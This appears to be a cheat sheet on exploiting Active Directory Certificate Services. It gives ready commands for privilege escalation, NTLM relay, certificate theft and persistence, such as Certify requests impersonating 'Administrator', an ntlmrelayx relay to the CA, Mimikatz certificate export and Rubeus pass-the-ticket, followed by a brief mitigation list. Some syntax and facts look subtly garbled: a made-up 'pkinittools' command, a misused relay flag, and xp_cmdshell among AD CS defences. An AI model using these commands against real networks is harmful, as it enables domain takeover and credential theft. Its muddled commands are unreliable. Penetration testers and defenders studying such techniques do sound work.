
### **Active Directory Certificate Services (AD CS) Exploitation Cheat Sheet**

Active Directory Certificate Services (AD CS) provides public key infrastructure (PKI) for an organization. While it's a powerful feature for managing certificates, it also presents potential attack vectors that can be exploited if misconfigured or improperly secured. Below is a cheat sheet that outlines the theory, tools, and examples of exploiting AD CS.

---

### **1. **Understanding the Basics of AD CS Exploitation**

- **AD CS Components**:
  - **Certification Authority (CA)**: Issues and manages certificates.
  - **Certificate Templates**: Predefined configurations for issuing certificates.
  - **Enrollment Services**: Services that allow users and computers to request certificates.

- **Common Attack Scenarios**:
  - **Privilege Escalation**: Abuse of certificate templates to obtain elevated access.
  - **Persistence**: Obtaining a certificate that can be used for long-term access.
  - **Lateral Movement**: Using certificates to move across systems within the network.

---

### **2. **Common Vulnerabilities and Exploits**

- **Vulnerable Certificate Templates**:
  - Misconfigured templates allowing any authenticated user to enroll for a certificate.
  - Templates that issue certificates with `Enhanced Key Usage` (EKU) values that allow client or domain authentication.
  - Templates that allow exporting private keys.

- **Relay Attacks**:
  - **NTLM Relaying to AD CS**: Allows an attacker to relay NTLM authentication to AD CS and request a certificate that can be used for domain authentication.

- **Certificate Theft**:
  - **Extracting Certificates**: Stealing certificates from disk or memory that can be used to impersonate users or computers.

- **Key Persistence**:
  - **Golden and Silver Tickets with Certificates**: Using certificates to maintain long-term access to an environment, similar to Kerberos golden and silver tickets.

---

### **3. **Tools for AD CS Exploitation**

#### **1. Certify**
- **Certify** is a tool developed by SpecterOps for enumerating and exploiting AD CS.

##### **Usage Example**:
- **Enumerate Certificate Templates**:
  ```powershell
  Certify.exe find /vulnerable
  ```
  
- **Request a Certificate**:
  ```powershell
  Certify.exe request /ca:"<CA_Name>" /template:"<Template_Name>" /altname:"<User_Name>"
  ```

#### **2. Rubeus**
- **Rubeus** is a C# toolset for raw Kerberos interaction and abuses.

##### **Usage Example**:
- **Request a TGT using a certificate**:
  ```powershell
  Rubeus.exe asktgt /user:<username> /certificate:<path_to_pfx>
  ```

- **Pass-the-Ticket with a certificate**:
  ```powershell
  Rubeus.exe ptt /ticket:<path_to_ticket>
  ```

#### **3. Impacket**
- **Impacket** is a collection of Python classes for working with network protocols, often used for relaying attacks.

##### **Usage Example**:
- **NTLM Relay to AD CS**:
  ```bash
  ntlmrelayx.py -t http://<CA_Server>/certsrv/certfnsh.asp -v -c <command>
  ```

#### **4. Certipy**
- **Certipy** is a Python toolset for enumerating and exploiting AD CS.

##### **Usage Example**:
- **Enumerate Vulnerable Certificate Templates**:
  ```bash
  certipy find -vulnerable
  ```

- **Request a Certificate**:
  ```bash
  certipy request -template <Template_Name> -ca <CA_Server>
  ```

#### **5. Mimikatz**
- **Mimikatz** is a well-known post-exploitation tool with capabilities for interacting with certificates.

##### **Usage Example**:
- **Export Certificates from Memory**:
  ```bash
  mimikatz.exe "crypto::cng exportCertificates"
  ```

#### **6. PKINITtools**
- **PKINITtools** can be used to abuse PKINIT to authenticate with a Kerberos TGT using a certificate.

##### **Usage Example**:
- **Use a Certificate for PKINIT**:
  ```bash
  pkinittools -user <username> -pfx <path_to_pfx> -domain <domain> -dc-ip <dc_ip>
  ```

---

### **4. **Exploitation Techniques**

#### **1. Abuse Misconfigured Certificate Templates**

- **Objective**: Obtain a certificate that allows for elevated privileges, such as authenticating as another user.
  
- **Steps**:
  1. **Enumerate Certificate Templates**: Use tools like `Certify` or `Certipy` to enumerate certificate templates and identify misconfigurations.
  2. **Request a Certificate**: Request a certificate for a user with elevated privileges using a vulnerable template.
  3. **Use the Certificate**: Use the certificate to authenticate as the target user.

##### **Example**:
```powershell
Certify.exe request /ca:"CA01\corp-CA" /template:"VulnerableTemplate" /altname:"Administrator"
```

#### **2. NTLM Relay to AD CS**

- **Objective**: Relay NTLM authentication to obtain a certificate from AD CS.

- **Steps**:
  1. **Set Up a Relay**: Use `ntlmrelayx` to relay NTLM authentication to AD CS.
  2. **Request a Certificate**: Relay the authentication to request a certificate.
  3. **Use the Certificate**: Use the obtained certificate to authenticate as the relayed user.

##### **Example**:
```bash
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -v -c "Certify.exe request /ca:'CA01\corp-CA' /template:'Machine' /altname:'Administrator'"
```

#### **3. Steal and Use Certificates**

- **Objective**: Steal and use a certificate to impersonate a user.

- **Steps**:
  1. **Extract Certificates**: Use `Mimikatz` or other tools to extract certificates from disk or memory.
  2. **Use the Certificate**: Import the certificate and use it for authentication.

##### **Example**:
```powershell
mimikatz.exe "crypto::cng exportCertificates"
```

#### **4. Persist with Certificates (Golden/Silver Tickets)**

- **Objective**: Maintain persistent access using a certificate.
  
- **Steps**:
  1. **Obtain a Certificate**: Use a certificate obtained from a vulnerable template or relayed NTLM authentication.
  2. **Authenticate with the Certificate**: Use `Rubeus` or `Certify` to authenticate and request a TGT.
  3. **Pass the Ticket**: Use `Rubeus` to pass the ticket and maintain access.

##### **Example**:
```powershell
Rubeus.exe asktgt /user:Administrator /certificate:path_to_certificate.pfx
Rubeus.exe ptt /ticket:<TGT_Ticket>
```

---

### **5. **Defense and Mitigation Strategies**

- **Audit and Harden Certificate Templates**: Regularly audit certificate templates to ensure they do not allow unintended users to request certificates.
- **Monitor and Alert on Certificate Usage**: Implement monitoring to detect unusual certificate requests or usage patterns.
- **Limit `xp_cmdshell` and NTLM Usage**: Disable `xp_cmdshell` where possible and limit the use of NTLM authentication.
- **Enable Extended Protection for Authentication (EPA)**: Enable EPA to protect against NTLM relay attacks.

---

